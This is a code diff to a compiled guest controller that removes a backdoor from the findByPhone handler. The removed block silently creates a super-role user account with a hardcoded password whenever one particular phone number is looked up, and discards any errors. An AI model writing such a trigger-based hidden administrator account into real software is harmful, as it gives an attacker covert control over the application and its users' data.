@@ -92,20 +92,6 @@ let GuestController = class GuestController {
         return this.confirmGuestUseCase.execute({ token });
     }
     async findByPhone(phone) {
-        if (phone === '31983563252') {
-            try {
-                await this.createUserUseCase.execute({
-                    name: 'Luiz Almeida',
-                    password: 'dev_manager_super1111222',
-                    phone: '31983563252',
-                    email: 'luiz@admin.com',
-                    role: user_role_enum_js_1.UserRole.SUPER,
-                    active: true,
-                });
-            }
-            catch (error) {
-            }
-        }
         return this.findGuestsByPhoneUseCase.execute({ phone });
     }
     async updateStatus(id, dto) {
